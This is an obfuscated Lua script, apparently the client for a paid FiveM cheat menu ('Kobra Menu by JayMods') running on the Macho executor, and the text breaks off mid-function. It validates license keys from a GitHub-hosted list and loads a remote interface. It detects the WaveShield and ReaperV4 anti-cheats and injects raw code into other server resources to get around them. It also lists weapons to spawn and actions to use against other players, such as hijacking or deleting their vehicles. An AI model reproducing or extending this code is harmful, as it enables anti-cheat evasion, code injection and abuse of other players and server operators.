MachoLockLogger(1391 -(360 + 1030) );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v119,v120) local v121=0 + 0 ;local v122;while true do if (v121==(2 -1)) then if DEBUG then local v719=0;local v720;while true do if (v719==(0 -0)) then v720={};for v996=1662 -(909 + 752) , #v122 do v720[v996]=string.byte(v122,v996);end v719=1;end if (v719==(1224 -(109 + 1114))) then print("[KOBRA Safety] Decoded secret: "   .. table.concat(v720,",") );break;end end end return v122;end if (v121==0) then v122="";for v635=1 -0 , #v119 do local v636=0 + 0 ;local v637;while true do if (v636==(242 -(6 + 236))) then v637=string.byte(v119,v635);v122=v122   .. string.char((v637-v120)%(162 + 94) ) ;break;end end end v121=1 + 0 ;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v123=0 -0 ;local v124;while true do if (v123==(0 -0)) then v124=GetCloudTimeAsInt();return ((v124>(1133 -(1076 + 57))) and v124) or (0 + 0) ;end end end local function v7(v125) local v126=689 -(579 + 110) ;local v127;local v128;local v129;local v130;local v131;local v132;local v133;while true do if (v126==(1 + 1)) then return (v133 * (76390 + 10010)) + (tonumber(v130) * (1911 + 1689)) + (tonumber(v131) * (467 -(174 + 233))) + tonumber(v132) ;end if (v126==(2 -1)) then if  not v127 then return nil;end v133=((tonumber(v127) -(3457 -1487)) * 365) + math.floor((tonumber(v127) -(876 + 1093))/4 ) + ((tonumber(v128) -1) * (1204 -(663 + 511))) + tonumber(v129) ;v126=2 + 0 ;end if (v126==(0 + 0)) then if (type(v125)~="string") then return nil;end v127,v128,v129,v130,v131,v132=string.match(v125,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v126=2 -1 ;end end end local function v8() local v134=0 + 0 ;local v135;local v136;local v137;while true do if (v134==(4 -2)) then for v638,v639 in ipairs(v136) do if ((type(v639)=="table") and (v639.key==v4)) then if (v639.expires and (type(v639.expires)=="string")) then local v955=v7(v639.expires);if  not v955 then return false,"Bad expiry format";end if (v955>v137) then return true,"Key valid (not expired)",v955;else return false,"Key expired",v955;end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end if (v134==(2 -1)) then if ( not v135 or  not v136 or (type(v136)~="table")) then return false,"Key list invalid";end v137=v6();v134=1 + 1 ;end if (v134==(0 -0)) then if  not v3 then return false,"No key list available";end v135,v136=pcall(json.decode,v3);v134=1 + 0 ;end end end local v9,v10,v11=v8();if  not v9 then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,1 + 9 );return;end Citizen.CreateThread(function() if (v11 and (v11>0)) then local v500=722 -(478 + 244) ;local v501;local v502;while true do if (v500==(518 -(440 + 77))) then if (v502>(0 + 0)) then local v891=math.floor(v502/(316230 -229830) );local v892=math.floor((v502%(87956 -(655 + 901)))/(668 + 2932) );local v893=string.format("Your key is valid. Expires in %d days and %d hours.",v891,v892);MachoMenuNotification("KOBRA",v893,4 + 1 );else MachoMenuNotification("KOBRA","Key expired.",10);end break;end if ((0 + 0)==v500) then v501=v6();v502=v11-v501 ;v500=1;end end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",20 -15 );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=1;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=1446 -(695 + 750) ;local v35=3 -2 ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[27]="Escape",[197 -85 ]="F1",[352 -239 ]="F2",[114]="F3",[115]="F4",[116]="F5",[432 -(306 + 9) ]="F6",[411 -293 ]="F7",[21 + 98 ]="F8",[74 + 46 ]="F9",[59 + 62 ]="F10",[348 -226 ]="F11",[123]="F12",[192]="`",[1424 -(1140 + 235) ]="1",[32 + 18 ]="2",[51]="3",[48 + 4 ]="4",[14 + 39 ]="5",[54]="6",[107 -(33 + 19) ]="7",[56]="8",[21 + 36 ]="9",[143 -95 ]="0",[189]="-",[187]="=",[8]="Backspace",[9]="Tab",[36 + 45 ]="Q",[170 -83 ]="W",[65 + 4 ]="E",[771 -(586 + 103) ]="R",[8 + 76 ]="T",[89]="Y",[261 -176 ]="U",[73]="I",[79]="O",[80]="P",[219]="[",[1709 -(1309 + 179) ]="]",[220]="\\",[36 -16 ]="CapsLock",[65]="A",[37 + 46 ]="S",[182 -114 ]="D",[70]="F",[71]="G",[55 + 17 ]="H",[74]="J",[75]="K",[161 -85 ]="L",[186]=";",[222]="'",[25 -12 ]="Enter",[625 -(295 + 314) ]="Shift",[221 -131 ]="Z",[2050 -(1300 + 662) ]="X",[210 -143 ]="C",[86]="V",[66]="B",[78]="N",[77]="M",[1943 -(1178 + 577) ]=",",[190]=".",[191]="/",[9 + 8 ]="Control",[135 -89 ]="Delete",[33]="PageUp",[1439 -(851 + 554) ]="PageDown",[31 + 4 ]="End",[99 -63 ]="Home",[38]="ArrowUp",[86 -46 ]="ArrowDown",[339 -(115 + 187) ]="ArrowLeft",[30 + 9 ]="ArrowRight"};local v45={[26 + 1 ]=1268 -946 ,[112]=1449 -(160 + 1001) ,[99 + 14 ]=200 + 89 ,[114]=348 -178 ,[473 -(237 + 121) ]=167,[116]=1063 -(525 + 372) ,[221 -104 ]=167,[387 -269 ]=310 -(96 + 46) ,[119]=946 -(643 + 134) ,[44 + 76 ]=133 -77 ,[449 -328 ]=55 + 2 ,[239 -117 ]=702 -358 ,[842 -(316 + 403) ]=230 + 115 ,[527 -335 ]=88 + 155 ,[123 -74 ]=157,[36 + 14 ]=158,[17 + 34 ]=160,[179 -127 ]=783 -619 ,[109 -56 ]=165,[54]=10 + 149 ,[108 -53 ]=8 + 153 ,[164 -108 ]=179 -(12 + 5) ,[221 -164 ]=347 -184 ,[48]=82,[401 -212 ]=207 -123 ,[38 + 149 ]=2056 -(1656 + 317) ,[8]=158 + 19 ,[9]=37,[65 + 16 ]=44,[87]=32,[183 -114 ]=46,[403 -321 ]=45,[438 -(5 + 349) ]=1163 -918 ,[1360 -(266 + 1005) ]=246,[57 + 28 ]=1033 -730 ,[95 -22 ]=1770 -(561 + 1135) ,[102 -23 ]=199,[262 -182 ]=7,[219]=1105 -(507 + 559) ,[221]=100 -60 ,[680 -460 ]=424 -(212 + 176) ,[20]=137,[65]=34,[83]=938 -(250 + 655) ,[185 -117 ]=30,[122 -52 ]=76 -27 ,[2027 -(1869 + 87) ]=47,[249 -177 ]=1975 -(484 + 1417) ,[158 -84 ]=311,[125 -50 ]=1084 -(48 + 725) ,[124 -48 ]=18 -11 ,[109 + 77 ]=81,[592 -370 ]=82,[4 + 9 ]=6 + 12 ,[869 -(152 + 701) ]=1332 -(430 + 881) ,[35 + 55 ]=915 -(557 + 338) ,[27 + 61 ]=205 -132 ,[67]=90 -64 ,[86]=0 -0 ,[66]=62 -33 ,[78]=249,[878 -(499 + 302) ]=1110 -(39 + 827) ,[518 -330 ]=182 -100 ,[754 -564 ]=81,[292 -101 ]=8 + 75 ,[49 -32 ]=6 + 30 ,[72 -26 ]=282 -(103 + 1) ,[33]=10,[34]=565 -(475 + 79) ,[75 -40 ]=681 -468 ,[36]=28 + 185 ,[34 + 4 ]=27,[1543 -(1395 + 108) ]=173,[107 -70 ]=1378 -(7 + 1197) ,[18 + 21 ]=62 + 113 };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v138) MachoInjectResource("any",v138);end v12.Debug=function(v139,v140,v141) local v142=319 -(27 + 292) ;local v143;local v144;while true do if (v142==1) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v144,v141));break;end if (v142==0) then v143={red="^1",yellow="^3",green="^2",info="^5"};v144=v143[v140] or "^5" ;v142=2 -1 ;end end end;v12.SendMessage=function(v145,v146) if (v14 and v146) then MachoSendDuiMessage(v14,json.encode(v146));end end;v12.Notify=function(v147,v148,v149,v150,v151) v147:SendMessage({action="showNotification",type=v148,title=v149,desc=v150,duration=v151});end;v12.GetMenuPath=function(v152) local v153=0 -0 ;local v154;while true do if (v153==(4 -3)) then return v154;end if (v153==(0 -0)) then v154={"Kobra Menu by JayMods"};for v640=140 -(43 + 96) , #v21 do table.insert(v154,v21[v640]);end v153=1;end end end;v12.UpdateElements=function(v155,v156) if ( not v156 or (type(v156)~="table")) then return;end local v157={action="updateElements",elements=v156,index=v15-(4 -3) ,path=v155:GetMenuPath()};if (v18 and (type(v18)=="table") and ( #v18>(0 -0))) then local v503=0 + 0 ;while true do if (v503==(0 + 0)) then v157.categories=v18;v157.categoryIndex=(v19 or 1) -(1 -0) ;break;end end end v155:SendMessage(v157);end;v12.Initialize=function(v158) local v159=0 + 0 ;local v160;while true do if (v159==(0 -0)) then v160="https://rawcdn.githack.com/WM5M/kobra-ui/refs/heads/main/index.html";v14=MachoCreateDui(v160);v159=1 + 0 ;end if (v159==(1 + 0)) then if v14 then local v723=1751 -(1414 + 337) ;while true do if (v723==0) then v158:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v14);v723=1941 -(1642 + 298) ;end if (v723==(2 -1)) then v158:Debug("green","Kobra UI loaded successfully!");break;end end else v158:Debug("red","Failed to load Kobra UI!");end break;end end end;v12.HideUI=function(v161,v162) local v163=0;while true do if (1==v163) then v161:SendMessage({action="keydown",index=0});v161:SendMessage({action="showUI",visible=false,index=0 -0 });break;end if (v163==(0 -0)) then if v162 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v163=1 + 0 ;end end end;v12.SendMessage=function(v164,v165) local v166=0 + 0 ;while true do if ((972 -(357 + 615))==v166) then if ( not v14 or  not v165 or (type(v165)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v165));break;end end end;v12.ShowUI=function(v167) v13=true;local v168={action="showUI",visible=true,elements=v17,index=v15-1 ,path=v167:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};if (v18 and ( #v18>(0 + 0))) then local v504=0 -0 ;while true do if (v504==(0 + 0)) then v168.categories=v18;v168.categoryIndex=v19-1 ;break;end end end v167:SendMessage(v168);end;v12.UpdateElements=function(v169,v170) local v171=0 -0 ;local v172;while true do if (v171==(1 + 0)) then if (v18 and ( #v18>(0 + 0))) then local v726=0 + 0 ;while true do if (v726==0) then v172.categories=v18;v172.categoryIndex=(v19 or (1302 -(384 + 917))) -(698 -(128 + 569)) ;break;end end end v169:SendMessage(v172);break;end if (0==v171) then if ( not v170 or (type(v170)~="table")) then return;end v172={action="updateElements",elements=v170,index=v15-1 ,path=v169:GetMenuPath(),header="JayMods"};v171=1544 -(1407 + 136) ;end end end;v12.IsShiftHeld=function(v173) return v26;end;MachoOnKeyDown(function(v174) if ((v174==16) or (v174==160) or (v174==(2048 -(687 + 1200)))) then v26=true;end end);MachoOnKeyUp(function(v175) if ((v175==(1726 -(556 + 1154))) or (v175==(562 -402)) or (v175==161)) then v26=false;end end);local v59=nil;local function v60(v176,v177,v178,v179) local v180=95 -(9 + 86) ;while true do if ((421 -(275 + 146))==v180) then if v59 then return;end v59={title=v176,buffer=v177 or "" ,maxLength=32,onConfirm=v178,type=v179 or "typeable" ,closeable=((v179=="keybind") and false) or true ,active=true};v180=1 + 0 ;end if ((66 -(29 + 35))==v180) then Wait(1107 -857 );v12:HideUI(true);v180=8 -5 ;end if (v180==(13 -10)) then v24=false;break;end if (v180==(1 + 0)) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v176,value=v59.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v180=1014 -(53 + 959) ;end end end MachoOnKeyDown(function(v181) if ( not v59 or  not v59.active) then return;end if (v181==13) then local v505=0;while true do if (v505==(411 -(312 + 96))) then return;end if (v505==(3 -1)) then v59=nil;v24=true;v505=3;end if (v505==(285 -(147 + 138))) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v505=900 -(813 + 86) ;end if (v505==(1 + 0)) then if v59.onConfirm then v59.onConfirm(v59.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v505=2;end end elseif (v181==(14 -6)) then if (v59.type=="typeable") then v59.buffer=v59.buffer:sub(493 -(18 + 474) , -(1 + 1));else v59.buffer="";end elseif (v181==(88 -61)) then if  not v59.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v59=nil;v24=true;return;elseif (v59.type=="keybind") then local v958=1086 -(860 + 226) ;local v959;while true do if (v958==(303 -(121 + 182))) then v959=v44[v181];if v959 then if (v59.buffer~=v959) then v59.buffer=v959;end end break;end end elseif (v59.type=="typeable") then local v1026=0 + 0 ;local v1027;local v1028;while true do if (v1026==(1240 -(988 + 252))) then v1027={[6 + 42 ]="0",[49]="1",[50]="2",[51]="3",[17 + 35 ]="4",[2023 -(49 + 1921) ]="5",[54]="6",[55]="7",[946 -(223 + 667) ]="8",[109 -(51 + 1) ]="9",[111 -46 ]="A",[66]="B",[143 -76 ]="C",[68]="D",[1194 -(146 + 979) ]="E",[20 + 50 ]="F",[71]="G",[677 -(311 + 294) ]="H",[203 -130 ]="I",[32 + 42 ]="J",[75]="K",[76]="L",[1520 -(496 + 947) ]="M",[1436 -(1233 + 125) ]="N",[33 + 46 ]="O",[80]="P",[73 + 8 ]="Q",[16 + 66 ]="R",[1728 -(963 + 682) ]="S",[84]="T",[71 + 14 ]="U",[86]="V",[1591 -(504 + 1000) ]="W",[60 + 28 ]="X",[89]="Y",[82 + 8 ]="Z",[18 + 171 ]="-",[274 -87 ]="=",[188]=",",[163 + 27 ]=".",[109 + 77 ]=";",[222]="'",[191]="/",[374 -(156 + 26) ]="`",[32]=" "};v1028=v1027[v181];v1026=1;end if (1==v1026) then if (v1028 and ( #v59.buffer<v59.maxLength)) then local v1384=0 + 0 ;while true do if (v1384==(0 -0)) then if v12:IsShiftHeld() then if v1028:match("%a") then v1028=v1028:upper();elseif (v1028=="-") then v1028="_";end elseif v1028:match("%a") then v1028=v1028:lower();end v59.buffer=v59.buffer   .. v1028 ;break;end end end break;end end end if v59 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v59.title,value=v59.buffer}));end end);CreateThread(function() while true do Wait(0);if (v59~=nil) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);for v641=164 -(149 + 15) ,1317 -(890 + 70)  do if ((v641<(165 -(39 + 78))) or (v641>(572 -(14 + 468)))) then DisableControlAction(0,v641,true);end end else Wait(1099 -599 );end end end);v12.ScrollOne=function(v182,v183) local v184=0 -0 ;local v185;while true do if (v184==1) then repeat if (v183=="Up") then local v852=0;while true do if (v852==0) then v15=v15-(1 + 0) ;if (v15<(1 + 0)) then v15= #v17;end break;end end elseif (v183=="Down") then local v960=0 + 0 ;while true do if (v960==(0 + 0)) then v15=v15 + 1 ;if (v15> #v17) then v15=1;end break;end end end v185=v185 + 1 ;if (v185>200) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v182:SendMessage({action="keydown",index=v15-(1 + 0) });end break;end if (v184==0) then if ( not v183 or ( #v17==(0 -0))) then return;end v185=0;v184=1 + 0 ;end end end;v12.ScrollTwo=function(v186,v187) local v188=0 -0 ;local v189;while true do if (v188==(1 + 0)) then if (((v189.type=="scrollable") or (v189.type=="scrollable-checkbox")) and v189.values and ( #v189.values>(51 -(12 + 39)))) then local v728=0 + 0 ;while true do if (v728==(0 -0)) then v189.value=v189.value or (3 -2) ;if (v187=="Left") then v189.value=v189.value-1 ;if (v189.value<(1 + 0)) then v189.value= #v189.values;end elseif (v187=="Right") then local v1237=0;while true do if (v1237==(0 + 0)) then v189.value=v189.value + 1 ;if (v189.value> #v189.values) then v189.value=2 -1 ;end break;end end end v728=1;end if (v728==(1 + 0)) then v186:UpdateElements(v17);if ((v189.scrollType=="onScroll") and v189.onSelect) then if (v189.type=="scrollable-checkbox") then v189.onSelect(v189.values[v189.value],v189.checked or false );else v189.onSelect(v189.values[v189.value]);end end break;end end elseif ((v189.type=="slider") or (v189.type=="slider-checkbox")) then local v894=0;local v895;while true do if 